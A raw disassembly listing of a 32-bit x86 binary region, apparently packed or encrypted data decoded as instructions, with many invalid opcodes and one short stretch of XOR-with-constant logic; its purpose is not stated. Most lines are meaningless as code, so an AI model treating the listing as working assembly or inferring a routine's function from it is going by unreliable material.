  4074b4:	mov    WORD PTR es:[esi-0x24fa71d5],gs
  4074bb:	ret    
  4074bc:	xor    BYTE PTR [ebx+0x6a],ah
  4074bf:	shr    BYTE PTR [esi-0x7a],cl
  4074c2:	ds iret 
  4074c4:	lea    ebp,[ecx+0x4b]
  4074c7:	xchg   ebp,eax
  4074c8:	pop    edi
  4074c9:	push   ds
  4074ca:	ss or  eax,0xd18b7ebe
  4074d0:	mov    eax,ebp
  4074d2:	loopne 0x40750b
  4074d4:	adc    edx,DWORD PTR [eax+ecx*4+0x7972683a]
  4074db:	mov    ebp,0x5ab175f3
  4074e0:	rcr    eax,0xf8
  4074e3:	xchg   edx,eax
  4074e4:	bnd ret 0xf9e4
  4074e8:	(bad)  
  4074e9:	in     al,0x50
  4074eb:	daa    
  4074ec:	pop    es
  4074ed:	dec    ebx
  4074ee:	xchg   esi,eax
  4074ef:	outs   dx,DWORD PTR ds:[esi]
  4074f0:	mov    ebp,0xdaaaa0cb
  4074f5:	push   eax
  4074f6:	dec    esp
  4074f7:	xchg   esi,eax
  4074f8:	and    esp,DWORD PTR ds:0x5a3dd6f3
  4074fe:	std    
  4074ff:	mov    ds:0x1812ab04,al
  407504:	pop    esi
  407505:	inc    ebx
  407506:	fcmovb st,st(7)
  407508:	outs   dx,BYTE PTR ds:[esi]
  407509:	in     al,0x19
  40750b:	pop    esp
  40750c:	psubusw mm1,mm3
  40750f:	jns    0x407506
  407511:	cdq    
  407512:	adc    al,0x32
  407514:	mov    eax,ds:0xe1244f4d
  407519:	mov    esi,0x6de05933
  40751e:	dec    ecx
  40751f:	hlt    
  407520:	jmp    0xd8e0:0x4887446b
  407527:	mov    ecx,0x4aca6e16
  40752c:	neg    bl
  40752e:	retf   0x57e3
  407531:	xchg   ebx,eax
  407532:	sub    DWORD PTR [eax+0x1d3dac5c],esi
  407538:	push   eax
  407539:	or     BYTE PTR gs:[edx],bl
  40753c:	bound  esp,QWORD PTR [eax]
  40753e:	push   ss
  40753f:	xchg   edx,eax
  407540:	imul   esi,edx,0x46
  407543:	mov    fs,WORD PTR [ebx+0x42]
  407546:	pop    edx
  407547:	xchg   edx,eax
  407548:	in     al,0x37
  40754a:	push   esi
  40754b:	test   BYTE PTR [ebx+0x141639d5],al
  407551:	jo     0x4074f2
  407553:	jmp    0xbccf4c4
  407558:	cdq    
  407559:	jo     0x407511
  40755b:	mov    BYTE PTR [ebp+esi*8+0x13],bh
  40755f:	xchg   DWORD PTR [edx+eax*8-0xf],ebp
  407563:	jl     0x407576
  407565:	sar    BYTE PTR [edi-0x43],0xdc
  407569:	pop    ecx
  40756a:	popf   
  40756b:	je     0x40759f
  40756d:	pop    edx
  40756e:	mov    bl,0x58
  407570:	and    eax,0xc7210fe4
  407575:	dec    esp
  407576:	jge    0x4075cd
  407578:	test   ah,al
  40757a:	or     ebx,edx
  40757c:	inc    eax
  40757d:	xchg   ebp,eax
  40757e:	push   cs
  40757f:	push   0x19e7cd6
  407584:	stos   BYTE PTR es:[edi],al
  407585:	xchg   DWORD PTR ds:0x78300353,esp
  40758b:	sub    edx,DWORD PTR [esi+eax*2-0xe]
  40758f:	adc    DWORD PTR [ebx+0xfb44d8b],eax
  407595:	lods   al,BYTE PTR ds:[esi]
  407596:	enter  0xc102,0xe9
  40759a:	add    ah,BYTE PTR [esi-0x75]
  40759d:	enter  0x458b,0xb0
  4075a1:	mov    edx,0x695d
  4075a6:	xor    cx,dx
  4075a9:	mov    edx,DWORD PTR [ebp-0x4c]
  4075ac:	xor    edx,edx
  4075ae:	shl    eax,0x1e
  4075b1:	mov    ax,dx
  4075b4:	or     ax,cx
  4075b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4075ba:	cmp    WORD PTR [ecx],ax
  4075bd:	je     0x407e12
  4075c3:	mov    eax,DWORD PTR [ebp+0x14]
  4075c6:	sub    DWORD PTR [ebp-0x4],eax
  4075c9:	mov    ecx,DWORD PTR [ebx]
  4075cb:	mov    eax,DWORD PTR [ebx+0x4]
  4075ce:	xor    eax,0x9c1b89e8
  4075d3:	xor    ecx,0xca79a577
  4075d9:	shrd   ecx,eax,0x2
  4075dd:	shr    eax,0x2
  4075e0:	mov    DWORD PTR [ebp-0x64],eax
  4075e3:	mov    eax,DWORD PTR [ebx]
  4075e5:	mov    edx,DWORD PTR [ebx+0x4]
  4075e8:	mov    edx,eax
  4075ea:	xor    eax,eax
  4075ec:	or     eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x70],eax
  4075f1:	mov    eax,DWORD PTR [esi]
  4075f3:	mov    ecx,DWORD PTR [esi+0x4]
  4075f6:	xor    ecx,0x9c1b89e8
  4075fc:	xor    eax,0xca79a577
  407601:	jmp    0x4079df
  407606:	mov    dl,0x68
  407608:	jg     0x407620
  40760a:	cmp    ebp,edi
  40760c:	sbb    ah,BYTE PTR [ecx+eax*1]
  40760f:	or     al,0x81
  407611:	mov    al,0x8f
  407613:	cmp    eax,0x7d176af2
  407618:	sbb    BYTE PTR [eax],bl
  40761a:	sahf   
  40761b:	adc    bl,BYTE PTR [eax]
  40761d:	sbb    BYTE PTR [esi-0x45d77c35],ah
  407623:	(bad)  
  407624:	sbb    BYTE PTR [eax],cl
  407626:	sbb    bh,dl
  407628:	inc    ecx
  407629:	test   al,0x39
  40762b:	inc    ebx
  40762c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40762d:	mov    DWORD PTR [ecx],ecx
  40762f:	or     eax,0x6d7f5495
  407634:	out    0xcf,eax
  407636:	dec    esp
  407637:	ja     0x407633
  407639:	(bad)  
  40763a:	push   ebp
  40763b:	fstp   QWORD PTR [eax+0x11]
  40763e:	out    0x68,al
  407640:	pop    eax
  407641:	mov    ?,WORD PTR [edi]
  407643:	mov    al,BYTE PTR [ebx+0x2d]
  407646:	cld    
  407647:	sub    al,0x17
  407649:	pop    ecx
  40764a:	or     eax,0xa1f25024
  40764f:	sbb    dl,BYTE PTR [esi]
  407651:	scas   al,BYTE PTR es:[edi]
  407652:	pop    ds
  407653:	rcr    DWORD PTR [ebp+0x63],cl
  407656:	data16 je 0x4076bb
  407659:	mov    edi,0xd5700a31
  40765e:	or     bl,ah
  407660:	fwait
  407661:	addr16 mov bh,0x9b
  407664:	fucomip st,st(0)
  407666:	and    eax,0xf44b0849
  40766b:	repz cmp DWORD PTR [esi],edi
  40766e:	lods   al,BYTE PTR ds:[esi]
  40766f:	add    ch,BYTE PTR [edi+0x1f]
  407672:	popf   
  407673:	mov    bh,0xc2
  407675:	mov    al,0xf9
  407677:	in     al,0x74
  407679:	and    eax,0xabee3e3e
  40767e:	icebp  
  40767f:	pop    esp
  407680:	cmp    DWORD PTR [ecx-0xe],ebp
  407683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407684:	xchg   ebp,eax
  407685:	sbb    DWORD PTR [ebp+0x65ab657f],esi
  40768b:	adc    BYTE PTR [ecx+0x22],al
  40768e:	xchg   edi,eax
  40768f:	pushf  
  407690:	jo     0x407650
  407692:	adc    ecx,DWORD PTR [ebp*8+0x1797992e]
  407699:	cld    
  40769a:	out    dx,al
  40769b:	pop    ss
  40769c:	sbb    BYTE PTR [edx-0x7b],al
  40769f:	jge    0x407720
  4076a1:	xor    eax,0x32771a22
  4076a6:	xlat   BYTE PTR ds:[ebx]
  4076a7:	int    0x18
  4076a9:	sahf   
  4076aa:	mov    bl,0xb2
  4076ac:	pop    esi
  4076ad:	push   esi
  4076ae:	sbb    esp,DWORD PTR [edx-0x7dbf7337]
  4076b4:	jecxz  0x4076f7
  4076b6:	jmp    0x407663
  4076b8:	add    al,0xd
  4076ba:	mov    BYTE PTR [ecx+0x7],al
  4076bd:	iret   
  4076be:	jns    0x407672
  4076c0:	hlt    
  4076c1:	out    dx,al
  4076c2:	sub    BYTE PTR [edi+0x2d],ah
  4076c5:	pop    ds
  4076c6:	jbe    0x40772d
  4076c8:	xor    eax,0xff0563ad
  4076cd:	out    0x1a,al
  4076cf:	repnz sbb ah,BYTE PTR [esi]
  4076d2:	and    al,0xf0
  4076d4:	adc    eax,0x55f21196
  4076d9:	call   0x2067:0x978771d7
  4076e0:	(bad)  
  4076e1:	cmc    
  4076e2:	mov    cl,0x40
  4076e4:	pop    ebp
  4076e5:	int3   
  4076e6:	in     eax,0xfd
  4076e8:	sbb    bl,al
  4076ea:	adc    eax,0x8b073432
  4076ef:	jno    0x4076de
  4076f1:	push   esi
  4076f2:	pop    esp
  4076f3:	add    BYTE PTR [esi+0xd],ah
  4076f6:	in     al,dx
  4076f7:	push   0x3e037e39
  4076fc:	add    dl,ch
  4076fe:	cmp    eax,0x287988b5
  407703:	leave  
  407704:	sub    al,0x12
  407706:	out    dx,eax
  407707:	dec    eax
  407708:	jmp    0x407721
  40770a:	mov    dh,0x3a
  40770c:	pop    edx
  40770d:	adc    eax,0x92eca0e9
  407712:	and    DWORD PTR [edx],0x4a0b0b57
  407718:	push   0x79
  40771a:	pop    esi
  40771b:	lods   eax,DWORD PTR ds:[esi]
  40771c:	or     DWORD PTR [ecx+eiz*1+0x32bc0998],ecx
  407723:	mov    eax,ds:0xee4e2ac
  407728:	mov    ch,0x48
  40772a:	imul   eax,ebx,0xffffffa4
  40772d:	jae    0x407787
  40772f:	dec    esp
  407730:	inc    esi
  407731:	push   edi
  407732:	clc    
  407733:	sbb    al,0x70
  407735:	icebp  
  407736:	sub    esp,DWORD PTR [ecx+0x57]
  407739:	jbe    0x40776b
  40773b:	adc    DWORD PTR [ebx],ecx
  40773d:	jno    0x407781
  40773f:	mov    DWORD PTR [edi+0x20],ebx
  407742:	je     0x40777a
  407744:	imul   edi,ebx,0x26f71da4
  40774a:	sbb    BYTE PTR ds:0x3bbfc87c,dl
  407750:	fbld   TBYTE PTR [ecx+0x258e6ba]
  407756:	popa   
  407757:	add    eax,0x2bacc228
  40775c:	ins    DWORD PTR es:[edi],dx
  40775d:	std    
  40775e:	hlt    
  40775f:	(bad)  
  407760:	fsub   DWORD PTR [edi+0x6b]
  407763:	cmp    DWORD PTR [edx-0x766b2f42],0x70c4544c
  40776d:	fisubr DWORD PTR [esp+eax*2-0x1a]
  407771:	mov    edi,0x25b65c3f
  407776:	sbb    BYTE PTR [esi+ebx*2-0x5c],al
  40777a:	test   eax,0xd9c545f6
  40777f:	rcl    DWORD PTR [edx],0xf5
  407782:	jnp    0x40776c
  407784:	mov    edi,0x90de81d3
  407789:	add    bh,al
  40778b:	repz push ebp
  40778d:	into   
  40778e:	es push edx
  407790:	out    dx,eax
  407791:	pop    es
  407792:	mov    ebx,0x6f373f96
  407797:	rol    DWORD PTR [edx+0xe765e18],0xa0
  40779e:	outs   dx,DWORD PTR ds:[esi]
  40779f:	push   es
  4077a0:	mov    WORD PTR [esi+0x7ef1845a],es
  4077a6:	scas   al,BYTE PTR es:[edi]
  4077a7:	fidiv  DWORD PTR [edx+0x41b6b1b2]
  4077ad:	push   0x24570a24
  4077b2:	xor    ah,BYTE PTR [ecx+edi*4+0x38bbc63d]
  4077b9:	(bad)  
  4077ba:	and    al,0x7a
  4077bc:	out    dx,al
  4077bd:	and    BYTE PTR [ebx-0x4f14c7a7],dl
  4077c3:	sbb    dh,ah
  4077c5:	pop    ss
  4077c6:	gs ds push esp
  4077c9:	push   eax
  4077ca:	mov    edi,0x682ab1bd
  4077cf:	dec    edi
  4077d0:	rcr    DWORD PTR [esi+0x58604273],1
  4077d6:	sub    DWORD PTR [esi+0x49b9b99e],eax
  4077dc:	imul   ecx,DWORD PTR [edx+0x53],0x25
  4077e0:	mul    BYTE PTR [edi+0x571c77a4]
  4077e6:	and    dh,BYTE PTR [eax+0x77]
  4077e9:	stos   BYTE PTR es:[edi],al
  4077ea:	and    ah,BYTE PTR [eax-0x23463b43]
  4077f0:	xchg   ebp,eax
  4077f1:	push   0x54
  4077f3:	sar    BYTE PTR [ebp+0x6d],cl
  4077f6:	and    eax,DWORD PTR [esp+eax*4+0x17]
  4077fa:	jmp    0x36a6:0x759f0304
  407801:	or     BYTE PTR [ecx+0x11],bl
  407804:	mov    ecx,0x98321625
  407809:	call   0x8bdae4d8
  40780e:	jns    0x4077fc
  407810:	inc    esp
  407811:	dec    edx
  407812:	xchg   ah,dh
  407814:	pop    esi
  407815:	adc    eax,0x394146c2
  40781a:	rcr    dh,cl
  40781c:	xor    BYTE PTR [eax-0x7d],0x4f
  407820:	fimul  DWORD PTR [ecx-0x43e7d40c]
  407826:	xchg   esp,eax
  407827:	in     eax,dx
  407828:	clc    
  407829:	push   ebx
  40782a:	rep lods eax,DWORD PTR ds:[esi]
  40782c:	or     BYTE PTR [edx],0x14
  40782f:	dec    edi
  407830:	mov    dh,bl
  407832:	dec    eax
  407833:	jmp    0x8d36f860
  407838:	lahf   
  407839:	into   
  40783a:	retf   
  40783b:	inc    eax
  40783c:	add    DWORD PTR [ecx+0x32],edi
  40783f:	es out 0x27,al
  407842:	fst    st(2)
  407844:	inc    ebp
  407845:	jo     0x4077c8
  407847:	cmp    eax,0xd63b5df3
  40784c:	push   esp
  40784d:	(bad)  
  40784e:	addr16 (bad) 
  407850:	mov    ebx,0xbfb30d4a
  407855:	outs   dx,DWORD PTR ds:[esi]
  407856:	dec    edx
  407857:	mov    esp,ecx
  407859:	loope  0x40783d
  40785b:	stos   BYTE PTR es:[edi],al
  40785c:	(bad)
  40785f:	xchg   edi,eax
  407860:	cdq    
  407861:	lods   eax,DWORD PTR ds:[esi]
  407862:	loopne 0x4077f4
  407864:	mov    esi,0xb5b8563b
  407869:	sar    DWORD PTR [ecx],1
  40786b:	xlat   BYTE PTR ds:[ebx]
  40786c:	pop    ecx
  40786d:	(bad)  
  40786e:	mov    edx,fs
  407870:	inc    edx
  407871:	mov    ecx,0x49db3b35
  407876:	xchg   DWORD PTR [edx],edx
  407878:	stc    
  407879:	inc    eax
  40787a:	xor    DWORD PTR [ecx-0x67],ebp
  40787d:	fsubr  DWORD PTR [esi+0x79]
  407880:	sub    eax,DWORD PTR [edx-0x80]
  407883:	push   ds
  407884:	add    BYTE PTR [ebp+0xfe9eb7b],0xce
  40788b:	add    DWORD PTR [ebp+0x5d2dd9f3],esp
  407891:	lods   al,BYTE PTR ds:[esi]
  407892:	dec    edx
  407893:	mul    BYTE PTR [ecx+0x3498e551]
  407899:	xchg   edx,eax
  40789a:	popf   
  40789b:	adc    eax,0xacec1864
  4078a0:	ins    DWORD PTR es:[edi],dx
  4078a1:	call   FWORD PTR [ecx]
  4078a3:	pop    ebx
  4078a4:	push   0x3629e06d
  4078a9:	idiv   DWORD PTR [eax+0x7773458e]
  4078af:	out    0xe6,eax
  4078b1:	mov    ds:0xf9b9d1fa,eax
  4078b6:	cwde   
  4078b7:	in     al,0x56
  4078b9:	ja     0x407874
  4078bb:	icebp  
  4078bc:	scas   al,BYTE PTR es:[edi]
  4078bd:	inc    edi
  4078be:	add    eax,0x6684b521
  4078c3:	push   es
  4078c4:	lds    eax,FWORD PTR [ebx+0x76944eff]
  4078ca:	jp     0x407869
  4078cc:	push   ecx
  4078cd:	push   ebx
  4078ce:	sbb    al,0xaa
  4078d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078d1:	pop    DWORD PTR [eax-0x63]
  4078d4:	or     ebx,eax
  4078d6:	sbb    DWORD PTR [eax+0x44],0xffffff91
  4078da:	jbe    0x407865
  4078dc:	adc    ch,ch
  4078de:	jno    0x4078fa
  4078e0:	dec    edi
  4078e1:	gs mov dl,0x1d
  4078e4:	dec    esi
  4078e5:	mov    DWORD PTR [edx+esi*1+0x69f33cc4],ecx
  4078ec:	cmp    ebp,eax
  4078ee:	arpl   si,di
  4078f0:	cmp    al,0xe1
  4078f2:	loop   0x4078bd
  4078f4:	add    DWORD PTR [ebp+0x2f6cf3a0],ebp
  4078fa:	rcl    BYTE PTR [ebp-0x518026cd],cl
  407900:	inc    ebp
  407901:	xchg   edx,eax
  407902:	adc    DWORD PTR [edi-0x6cce6483],ebx
  407908:	test   BYTE PTR [ebx],0xf
  40790b:	sbb    BYTE PTR es:[ecx-0x5a05029e],ah
  407912:	icebp  
  407913:	inc    edx
  407914:	rol    DWORD PTR [ebx],cl
  407916:	aas    
  407917:	cwde   
  407918:	(bad)  
  407919:	mov    ah,0x1d
  40791b:	mov    ds:0xb44e22d6,al
  407920:	jmp    DWORD PTR [ecx+0x320cb83d]
  407926:	shr    DWORD PTR [edi+0x39e1b98],cl
  40792c:	inc    edx
  40792d:	mov    bl,0xdf
  40792f:	jae    0x407976
  407931:	sbb    BYTE PTR [ecx+0x1e],0xaf
  407935:	jae    0x40797d
  407937:	out    dx,eax
  407938:	fsub   DWORD PTR [ecx+0x4e42be8a]
  40793e:	loop   0x40798b
  407940:	ss call 0x49dc:0x1d5ede69
  407948:	jns    0x407915
  40794a:	cmc    
  40794b:	repz ja 0x407953
  40794e:	sub    eax,0xffffffce
  407951:	add    DWORD PTR [ecx+0x7701a1d5],ebx
  407957:	sahf   
  407958:	push   ds
  407959:	push   ecx
  40795a:	mov    cl,0x6f
  40795c:	pop    ebp
  40795d:	and    ah,dh
  40795f:	gs out dx,al
  407961:	or     eax,0x5cbd5d91
  407966:	(bad)  
  407967:	mov    cl,BYTE PTR [ecx-0x228e9546]
  40796d:	into   
  40796e:	sahf   
  40796f:	std    
  407970:	retf   0xbab9
  407973:	pop    ebp
  407974:	cmc    
  407975:	mov    BYTE PTR [edx-0x1df69d3b],dh
  40797b:	push   ecx
  40797c:	mov    edx,0x736b609b
  407981:	scas   al,BYTE PTR es:[edi]
  407982:	xchg   ebx,eax
  407983:	ret    
  407984:	push   es
  407985:	rep outs dx,DWORD PTR ds:[esi]
  407987:	cld    
  407988:	xchg   edi,eax
  407989:	inc    ebx
  40798a:	add    DWORD PTR ds:0xc0828348,eax
  407990:	push   ss
  407991:	outs   dx,BYTE PTR ds:[esi]
  407992:	mov    eax,0x9865f9f5
  407997:	add    ch,BYTE PTR [edx+0x3c]
  40799a:	lods   eax,DWORD PTR ds:[esi]
  40799b:	cld    
  40799c:	inc    ecx
  40799d:	aam    0x1d
  40799f:	(bad)  
  4079a0:	int    0xfe
  4079a2:	or     dl,BYTE PTR [edi+0x64]
  4079a5:	cmp    ebp,DWORD PTR ds:0x60434a09
  4079ab:	jb     0x407981
  4079ad:	jno    0x407956
  4079af:	retf   0x383
  4079b2:	clc    
  4079b3:	inc    esi
  4079b4:	add    BYTE PTR ds:0x84795a66,ch
  4079ba:	push   cs
  4079bb:	xchg   BYTE PTR [edi+0x5476596b],ch
  4079c1:	std    
  4079c2:	popf   
  4079c3:	mov    ds:0xa54739b4,eax
  4079c8:	sar    DWORD PTR [ecx+0x34],1
  4079cb:	push   0x8cb3f4f7
  4079d0:	lahf   
  4079d1:	sub    al,0x65
  4079d3:	hlt    
  4079d4:	adc    DWORD PTR [esi+eiz*8],esp
  4079d7:	ja     0x4079b0
  4079d9:	xchg   DWORD PTR [edx],ebp
  4079db:	and    BYTE PTR [esi+0x4589589a],bh
  4079e1:	int3   
  4079e2:	jmp    0x407dc0
  4079e7:	repnz jecxz 0x407a47
  4079ea:	jmp    0x407a49
  4079ec:	imul   esp,DWORD PTR [ebx-0x25],0xffffffa9
  4079f0:	pushf  
  4079f1:	pop    ds
  4079f2:	jle    0x4079be
  4079f4:	xor    al,0x0
  4079f6:	mov    esi,0x1818759d
  4079fb:	sahf   
  4079fc:	adc    bl,BYTE PTR [eax]
  4079fe:	sbb    BYTE PTR [ecx+0xef8af71],bh
  407a04:	and    dl,BYTE PTR [eax]
  407a06:	jae    0x4079fe
  407a08:	xchg   DWORD PTR [edi+0x25cc3c32],ebp
  407a0e:	xchg   esi,eax
  407a0f:	jecxz  0x4079e2
  407a11:	sub    bl,BYTE PTR [edx]
  407a13:	into   
  407a14:	gs push esi
  407a16:	ja     0x4079de
  407a18:	jae    0x407a7e
  407a1a:	test   al,0xbd
  407a1c:	add    eax,0x32ae8fee
  407a21:	loop   0x407a7b
  407a23:	popf   
  407a24:	xchg   edx,eax
  407a25:	cmp    al,0xf1
  407a27:	mov    bh,0x87
  407a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a2a:	test   DWORD PTR [ebx],ebp
  407a2c:	sub    eax,0x3e8286c7
  407a31:	add    esi,DWORD PTR [edi-0x6f]
  407a34:	arpl   WORD PTR [edi+0xd],di
  407a37:	jb     0x4079dc
  407a39:	adc    DWORD PTR [edx-0x2],0x51623204
  407a40:	sbb    DWORD PTR ds:0x235756d,edi
  407a46:	out    dx,eax
  407a47:	mov    ah,BYTE PTR [edi-0x496d1bf]
  407a4d:	shl    DWORD PTR [ebx+0x139cc24d],1
  407a53:	sub    eax,0xe1908ec0
  407a58:	ret    0x920c
  407a5b:	or     esp,ebp
  407a5d:	mov    eax,0xc0cd8fe0
  407a62:	inc    edx
  407a63:	mov    bl,0xa
  407a65:	outs   dx,BYTE PTR ds:[esi]
  407a66:	xor    eax,0x88148534
  407a6b:	(bad)  
  407a6c:	(bad)  
  407a6e:	xchg   ebp,eax
  407a6f:	pop    ds
  407a70:	or     al,0x3c
  407a72:	adc    edx,DWORD PTR [esi]
  407a74:	mov    BYTE PTR [edx-0x7c],al
  407a77:	push   ebx
  407a78:	add    cl,cl
  407a7a:	(bad)  
  407a7b:	mov    ebp,ecx
  407a7d:	jns    0x407a06
  407a7f:	addr16 gs cmp al,0xd4
  407a83:	and    al,0x41
  407a85:	cmc    
  407a86:	fld    DWORD PTR [edi-0x49b35d49]
  407a8c:	xor    bl,BYTE PTR [ebp+0x42e014e]
  407a92:	sbb    eax,0x5e3ea949
  407a97:	sub    edi,esp
  407a99:	call   0x11a3:0x6acccb37
  407aa0:	stc    
  407aa1:	(bad)  
  407aa2:	imul   DWORD PTR [edx]
  407aa4:	xchg   ebx,eax
  407aa5:	test   al,0x13
  407aa7:	push   edx
  407aa8:	dec    ecx
  407aa9:	test   DWORD PTR [edi-0x49],eax
  407aac:	ja     0x407ab2
  407aae:	adc    bl,BYTE PTR [eax+0x48e5bf34]
  407ab4:	out    0xfa,eax
  407ab6:	scas   eax,DWORD PTR es:[edi]
  407ab7:	fs fcmovnb st,st(2)
  407aba:	dec    eax
  407abb:	call   0x6794:0x4a63dfe8
  407ac2:	or     eax,DWORD PTR cs:[eax+0x7c5823de]
  407ac9:	dec    ebp
  407aca:	dec    ecx
  407acb:	xor    ch,BYTE PTR [edi+ebp*2-0x2df1be84]
  407ad2:	push   0xffffff88
  407ad4:	dec    edi
  407ad5:	sub    al,0x27
  407ad7:	or     eax,0xd8e0d216
  407adc:	xor    eax,0x488cdd04
  407ae1:	dec    esp
  407ae2:	js     0x407afc
  407ae4:	mov    ch,0xc7
  407ae6:	ins    DWORD PTR es:[edi],dx
  407ae7:	rcl    dl,1
  407ae9:	cmp    BYTE PTR [esi-0x51],cl
  407aec:	add    eax,0xb3464c7f
  407af1:	sahf   
  407af2:	in     eax,0xd3
  407af4:	jns    0x407b21
  407af6:	sub    DWORD PTR [edi],edx
  407af8:	(bad)  
  407af9:	mov    DWORD PTR [ebx+0xd220633],edx
  407aff:	xor    BYTE PTR [edi+edx*4+0x78f8841e],bl
  407b06:	jno    0x407add
  407b08:	xchg   ebp,eax
  407b09:	and    ch,0x89
  407b0c:	mov    ebx,ecx
  407b0e:	and    al,BYTE PTR [ecx+0x7fd2b7d2]
  407b14:	xchg   esi,eax
  407b15:	out    0xbe,eax
  407b17:	jge    0x407af2
  407b19:	scas   eax,DWORD PTR es:[edi]
  407b1a:	jbe    0x407b58
  407b1c:	or     DWORD PTR [edx-0x991756d],edi
  407b22:	push   es
  407b23:	cmp    eax,0xd6b84d03
  407b28:	in     al,dx
  407b29:	test   al,0x1b
  407b2b:	jmp    FWORD PTR [edx-0x7]
  407b2e:	inc    edx
  407b2f:	inc    bl
  407b31:	lock int3 
  407b33:	sub    al,0x4
  407b35:	jne    0x407b41
  407b37:	out    dx,eax
  407b38:	unpckhps xmm4,XMMWORD PTR [esi-0x77a45e10]
  407b3f:	les    esp,FWORD PTR [edi-0x7e]
  407b42:	push   ecx
  407b43:	and    BYTE PTR [edx],al
  407b45:	ins    DWORD PTR es:[edi],dx
  407b46:	push   eax
  407b47:	fstp   DWORD PTR [edi-0x19]
  407b4a:	adc    eax,0xc3b29fa0
  407b4f:	dec    eax
  407b50:	push   eax
  407b51:	sbb    al,0x70
  407b53:	dec    ecx
  407b54:	imul   ebp,DWORD PTR [esi+ebx*8-0x36],0x8951e02
  407b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b5d:	mov    al,ds:0xbf261c3d
  407b62:	jmp    0x407bdb
  407b64:	and    al,0xad
  407b66:	sub    DWORD PTR [edx],ebx
  407b68:	aam    0x3
  407b6a:	dec    edi
  407b6b:	pop    ds
  407b6c:	add    al,0x34
  407b6e:	and    eax,0xf0b6e574
  407b73:	pusha  
  407b74:	into   
  407b75:	jne    0x407b05
  407b77:	mov    ebx,0xb797d465
  407b7c:	sbb    eax,0x62bb22f1
  407b81:	mov    gs,WORD PTR [esi]
  407b83:	cmp    al,0x7
  407b85:	mov    eax,ds:0x47b3e8c9
  407b8a:	arpl   WORD PTR [ebp+0x10b266c1],si
  407b90:	loopne 0x407b39
  407b92:	les    edx,FWORD PTR [ebp+eax*2+0x5660c254]
  407b99:	stos   DWORD PTR es:[edi],eax
  407b9a:	xchg   ecx,ecx
  407b9c:	in     al,dx
  407b9d:	push   cs
  407b9e:	inc    esp
  407b9f:	loope  0x407bd7
  407ba1:	mov    bl,0xda
  407ba3:	jl     0x407b5f
  407ba5:	adc    al,0xec
  407ba7:	cs inc esp
  407ba9:	stos   DWORD PTR es:[edi],eax
  407baa:	es jge 0x407ba2
  407bad:	sar    BYTE PTR [ebp+0x4f],1
  407bb0:	aam    0x57
  407bb2:	sti    
  407bb3:	jne    0x407b9e
  407bb5:	sub    bl,ch
  407bb7:	gs push ds
  407bb9:	aas    
  407bba:	add    ah,al
  407bbc:	or     al,0xd
  407bbe:	hlt    
  407bbf:	add    al,0xa2
  407bc1:	btc    DWORD PTR es:[esi+ecx*8],esp
  407bc6:	test   edi,0x64d7e7a4
  407bcc:	mov    eax,ss:0x9462e18e
  407bd2:	and    dl,cl
  407bd4:	cmp    ecx,ebx
  407bd6:	jp     0x407bab
  407bd8:	das    
  407bd9:	or     DWORD PTR [eax+0x5171d9a7],edx
  407bdf:	xchg   esp,eax
  407be0:	test   bl,al
  407be2:	retf   0x6e12
  407be5:	add    edx,edx
  407be7:	mov    al,ds:0xc9dd2fd3
  407bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bed:	(bad)  
  407bee:	test   DWORD PTR [ecx-0x5948f454],0xbc8b9278
  407bf8:	mov    ds:0xe98bdfd3,eax
  407bfd:	inc    eax
  407bfe:	sub    bh,BYTE PTR [esi]
  407c00:	and    DWORD PTR [ebx+0x79f2e69c],edi
  407c06:	cmp    DWORD PTR ds:0x3fbb524e,esi
  407c0c:	mov    al,BYTE PTR [eax]
  407c0e:	inc    ebp
  407c0f:	out    dx,al
  407c10:	dec    esi
  407c11:	ret    
  407c12:	hlt    
  407c13:	mov    ecx,0x9231a165
  407c18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c19:	jbe    0x407bee
  407c1b:	cdq    
  407c1c:	lods   eax,DWORD PTR ds:[esi]
  407c1d:	popa   
  407c1e:	call   0xb748d1fb
  407c23:	adc    dl,0xf9
  407c26:	add    al,0xef
  407c28:	jo     0x407bf7
  407c2a:	aaa    
  407c2b:	or     BYTE PTR [ecx+ecx*1+0x1e],0x2f
  407c30:	and    al,0x63
  407c32:	xlat   BYTE PTR ds:[ebx]
  407c33:	enter  0x481a,0x86
  407c37:	scas   eax,DWORD PTR es:[edi]
  407c38:	jno    0x407bfe
  407c3a:	enter  0xf0ee,0x25
  407c3e:	or     ebp,ecx
  407c40:	inc    esi
  407c41:	imul   edx,edx,0x33
  407c44:	rcr    DWORD PTR [eax+esi*2],cl
  407c47:	popf   
  407c48:	mov    DWORD PTR [edi+ebp*4],edi
  407c4b:	addr16 cld 
  407c4d:	out    dx,eax
  407c4e:	je     0x407bd2
  407c50:	jg     0x407c28
  407c52:	xchg   edi,eax
  407c53:	or     esp,0xda45016b
  407c59:	leave  
  407c5a:	std    
  407c5b:	lock or al,0xdb
  407c5e:	inc    edi
  407c5f:	clc    
  407c60:	cmp    DWORD PTR cs:[esi-0x4cf6a2f9],0xfffffff9
  407c68:	das    
  407c69:	stos   BYTE PTR es:[edi],al
  407c6a:	iret   
  407c6b:	xchg   ecx,eax
  407c6c:	mov    DWORD PTR [ebp-0x203c9eb4],ebx
  407c72:	in     eax,dx
  407c73:	dec    ebx
  407c74:	gs mov ecx,0x894de46e
  407c7a:	xor    esp,ebx
  407c7c:	(bad)  
  407c7d:	adc    ecx,ecx
  407c7f:	fisub  WORD PTR [ebx+0x437740f3]
  407c85:	fwait
  407c86:	cs jl  0x407c67
  407c89:	sbb    dh,BYTE PTR [edi+edx*1]
  407c8c:	sub    esp,DWORD PTR [eax-0x5cf253a3]
  407c92:	mov    al,ds:0x46d9289c
  407c97:	xchg   ebx,eax
  407c98:	push   0x38679afb
  407c9d:	push   ecx
  407c9e:	adc    dh,BYTE PTR [ecx+0x43]
  407ca1:	inc    esp
  407ca2:	mov    ch,0xca
  407ca4:	cmp    ch,BYTE PTR [ebp+0x34a801b]
  407caa:	and    al,0xa0
  407cac:	xor    BYTE PTR [ebx+0x2f],ah
  407caf:	sbb    eax,DWORD PTR [esi-0x62845e6f]
  407cb5:	test   BYTE PTR [ecx+0xdf035b6],0x16
  407cbc:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
